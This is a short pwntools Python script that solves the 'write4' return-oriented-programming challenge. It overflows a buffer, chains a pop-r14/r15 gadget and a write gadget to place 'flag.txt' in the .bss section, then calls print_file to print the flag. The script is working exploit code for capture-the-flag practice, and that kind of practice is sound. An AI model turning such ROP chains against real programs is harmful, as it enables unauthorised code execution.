#!#!/usr/bin/env python3
from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./write4")


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


rop = ROP(elf)

POP_R14_R15 = rop.r14.address

rop.raw(b"A" * cyclic_find(0x6161616161616166, n=8))
rop.raw(p64(POP_R14_R15))
rop.raw(p64(elf.bss()))
rop.raw(b"flag.txt")
rop.raw(p64(0x400628))
rop.call('print_file', [elf.bss()])

log.info(rop.dump())

p = start()
p.sendline(rop.chain())

log.success(p.recvall().decode().strip())
